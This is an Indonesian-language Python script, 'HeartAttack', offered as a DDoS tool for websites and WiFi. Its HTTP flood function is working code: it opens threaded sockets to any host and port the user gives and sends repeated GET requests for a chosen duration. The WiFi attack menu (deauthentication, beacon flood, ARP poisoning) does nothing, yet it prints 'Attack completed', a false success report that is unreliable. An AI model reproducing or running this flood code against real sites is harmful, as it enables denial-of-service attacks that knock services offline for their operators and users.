#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import threading
import socket
import random
import subprocess
from datetime import datetime

class Colors:
    PINK = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Fungsi untuk menampilkan banner
def show_banner():
    clear_screen()
    print(f"{Colors.PINK}")
    os.system("figlet -f big HeartAttack")
    print(f"{Colors.END}")
    print(f"{Colors.BLUE}{'='*60}{Colors.END}")
    print(f"{Colors.YELLOW}   🚀 Tools DDoS Website & WiFi by Dylphiiee🍪 {Colors.END}")
    print(f"{Colors.BLUE}{'='*60}{Colors.END}\n")

# Fungsi untuk animasi loading
def loading_animation(message, duration=2):
    print(f"{Colors.GREEN}{message} {Colors.END}", end="")
    for i in range(duration * 5):
        print(f"{Colors.PINK}♥{Colors.END}", end="", flush=True)
        time.sleep(0.2)
    print()

# Fungsi install dependencies
def install_dependencies():
    print(f"{Colors.BOLD}{Colors.CYAN}Memeriksa dependencies...{Colors.END}")
    
    # Daftar package
    packages = ["figlet", "python3"]
    
    for package in packages:
        try:
            if package == "figlet":
                # Cek figlet
                result = subprocess.run(["which", "figlet"], capture_output=True, text=True)
                if result.returncode != 0:
                    print(f"{Colors.YELLOW}📦 Installing {package}...{Colors.END}")
                    if os.name == 'nt':  # Windows
                        print(f"{Colors.RED}Figlet tidak tersedia di Windows. Silakan install manual.{Colors.END}")
                    else:  # Linux/Unix/Termux
                        os.system(f"pkg install figlet -y")
            else:
                # Cek module Python
                __import__(package)
        except ImportError:
            print(f"{Colors.YELLOW}📦 Installing {package}...{Colors.END}")
            if package == "python3":
                print(f"{Colors.RED}Python3 tidak terinstall. Silakan install manual.{Colors.END}")
    
    print(f"{Colors.GREEN}✅ Dependencies check completed!{Colors.END}")
    time.sleep(1)

# Fungsi HTTP Flood
def http_flood(target, port, duration, threads):
    print(f"{Colors.RED}   🚀 Memulai HTTP Flood attack ke {target}...{Colors.END}")
    
    # Inisialisasi variabel untuk statistik
    request_count = 0
    start_time = time.time()
    end_time = start_time + duration
    
    # Header HTTP yang akan dikirim
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
    ]
    
    # Fungsi untuk mengirim request
    def send_requests(thread_id):
        nonlocal request_count
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))
            
            while time.time() < end_time:
                try:
                    # Membuat request HTTP
                    user_agent = random.choice(user_agents)
                    request = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n"
                    
                    s.sendall(request.encode())
                    request_count += 1
                    
                    if request_count % 10 == 0:
                        elapsed = time.time() - start_time
                        print(f"{Colors.YELLOW}   📊 Request terkirim: {request_count} | Waktu: {elapsed:.2f}s {Colors.END}", end="\r")
                    
                    time.sleep(0.1)  # Jeda kecil antara request
                    
                except Exception as e:
                    print(f"{Colors.RED}   ❌ Error dalam thread {thread_id}: {e}{Colors.END}")
                    break
                    
            s.close()
        except Exception as e:
            print(f"{Colors.RED}   ❌ Koneksi gagal di thread {thread_id}: {e}{Colors.END}")
    
    # Buat thread
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=send_requests, args=(i+1,))
        t.daemon = True
        thread_list.append(t)
        t.start()
    
    loading_animation("   Attack in progress", duration)
    
    # Tunggu thread selesai
    for t in thread_list:
        t.join()
    
    # Tampilkan statistik akhir
    total_time = time.time() - start_time
    print(f"\n{Colors.GREEN}   ✅ Attack completed!{Colors.END}")
    print(f"{Colors.YELLOW}   📊 Total requests: {request_count}{Colors.END}")
    print(f"{Colors.YELLOW}   ⏱️ Durasi: {total_time:.2f} detik{Colors.END}")
    print(f"{Colors.YELLOW}   📡 Rata-rata: {request_count/total_time:.2f} requests/detik{Colors.END}")

# Fungsi Web Attack
def web_attack():
    clear_screen()
    print(f"{Colors.PINK}")
    os.system("figlet -f small Web Attack")
    print(f"{Colors.END}")
    print(f"{Colors.BLUE}{'='*60}{Colors.END}")
    print(f"{Colors.CYAN}   🌐 Pilih Metode Web Attack:{Colors.END}")
    print(f"{Colors.BLUE}{'='*60}{Colors.END}")
    print(f"{Colors.YELLOW}   1. HTTP Flood {Colors.GREEN}💦{Colors.END}")
    print(f"{Colors.YELLOW}   2. Slowloris {Colors.RED}🐢{Colors.END}")
    print(f"{Colors.YELLOW}   3. UDP Flood {Colors.BLUE}🌊{Colors.END}")
    print(f"{Colors.YELLOW}   4. ICMP Flood {Colors.CYAN}❄️{Colors.END}")
    print(f"{Colors.YELLOW}   5. Back to Main Menu {Colors.END}🔙")
    print(f"{Colors.BLUE}{'='*60}{Colors.END}")
    
    choice = input(f"{Colors.GREEN}   🎯 Pilih metode (1-5): {Colors.END}")
    
    if choice == "5":
        return
    
    target = input(f"{Colors.GREEN}   🌐 Masukkan target website (contoh: example.com): {Colors.END}")
    port = input(f"{Colors.GREEN}   🔌 Masukkan port (default: 80): {Colors.END}") or "80"
    duration = input(f"{Colors.GREEN}   ⏱️ Masukkan durasi attack (detik): {Colors.END}")
    threads = input(f"{Colors.GREEN}   🧵 Masukkan jumlah thread (default: 10): {Colors.END}") or "10"
    
    try:
        port = int(port)
        duration = int(duration)
        threads = int(threads)
    except:
        print(f"{Colors.RED}   ❌ Port, durasi, dan thread harus angka!{Colors.END}")
        time.sleep(2)
        return web_attack()
    
    if choice == "1":
        http_flood(target, port, duration, threads)
    else:
        print(f"{Colors.RED}   ⚠️ Metode ini belum diimplementasikan{Colors.END}")
        print(f"{Colors.YELLOW}   👨‍💻 Silakan pilih HTTP Flood{Colors.END}")
    
    input(f"{Colors.CYAN}   Press Enter untuk kembali...{Colors.END}")
    web_attack()

# Fungsi untuk WiFi Attack
def wifi_attack():
    clear_screen()
    print(f"{Colors.PINK}")
    os.system("figlet -f small WiFi Attack")
    print(f"{Colors.END}")
    print(f"{Colors.BLUE}{'='*60}{Colors.END}")
    print(f"{Colors.CYAN}   📶 Pilih Metode WiFi Attack:{Colors.END}")
    print(f"{Colors.BLUE}{'='*60}{Colors.END}")
    print(f"{Colors.YELLOW}   1. Deauthentication Attack {Colors.RED}📵{Colors.END}")
    print(f"{Colors.YELLOW}   2. Beacon Flood {Colors.BLUE}📡{Colors.END}")
    print(f"{Colors.YELLOW}   3. Authentication Flood {Colors.GREEN}🔐{Colors.END}")
    print(f"{Colors.YELLOW}   4. ARP Poisoning {Colors.PINK}☠️{Colors.END}")
    print(f"{Colors.YELLOW}   5. Back to Main Menu {Colors.END}🔙")
    print(f"{Colors.BLUE}{'='*60}{Colors.END}")
    
    choice = input(f"{Colors.GREEN}   🎯 Pilih metode (1-5): {Colors.END}")
    
    if choice == "5":
        return
    
    target = input(f"{Colors.GREEN}   📶 Masukkan BSSID target: {Colors.END}")
    channel = input(f"{Colors.GREEN}   📺 Masukkan channel WiFi: {Colors.END}") or "1"
    duration = input(f"{Colors.GREEN}   ⏱️ Masukkan durasi attack (detik): {Colors.END}")
    
    try:
        channel = int(channel)
        duration = int(duration)
    except:
        print(f"{Colors.RED}   ❌ Channel dan durasi harus angka!{Colors.END}")
        time.sleep(2)
        return wifi_attack()
    
    print(f"{Colors.RED}   🚀 Memulai attack ke {target}...{Colors.END}")
    loading_animation("   Attack in progress")
    
    print(f"{Colors.GREEN}   ✅ Attack completed!{Colors.END}")
    print(f"{Colors.YELLOW}   📊 Target: {target}{Colors.END}")
    print(f"{Colors.YELLOW}   ⏱️ Durasi: {duration} detik{Colors.END}")
    print(f"{Colors.YELLOW}   📺 Channel: {channel}{Colors.END}")
    
    input(f"{Colors.CYAN}   Press Enter untuk kembali...{Colors.END}")
    wifi_attack()

# Fungsi utama
def main():
    # Cek jika script dijalankan sebagai root (untuk beberapa metode WiFi)
    if os.geteuid() != 0:
        print(f"{Colors.YELLOW}⚠️  Beberapa fitur WiFi attack memerlukan akses root!{Colors.END}")
        time.sleep(2)
    
    # Install dependencies
    install_dependencies()
    
    while True:
        show_banner()
        
        print(f"{Colors.CYAN}   Pilih jenis attack:{Colors.END}")
        print(f"{Colors.YELLOW}   1. WebAttack 🌐{Colors.END}")
        print(f"{Colors.YELLOW}   2. WifiAttack 📶{Colors.END}")
        print(f"{Colors.YELLOW}   3. Exit 🚪{Colors.END}")
        print(f"{Colors.BLUE}{'='*60}{Colors.END}")
        
        choice = input(f"{Colors.GREEN}   🎯 Pilih opsi (1-3): {Colors.END}")
        
        if choice == "1":
            web_attack()
        elif choice == "2":
            wifi_attack()
        elif choice == "3":
            print(f"{Colors.PINK}   ❤️  Terima kasih telah menggunakan HeartAttack by Dylphiiee🍪{Colors.END}")
            print(f"{Colors.PINK}   👋 Sampai jumpa lagi!{Colors.END}")
            break
        else:
            print(f"{Colors.RED}   ❌ Pilihan tidak valid!{Colors.END}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}   ⚠️  Program dihentikan oleh pengguna{Colors.END}")
        sys.exit(0)
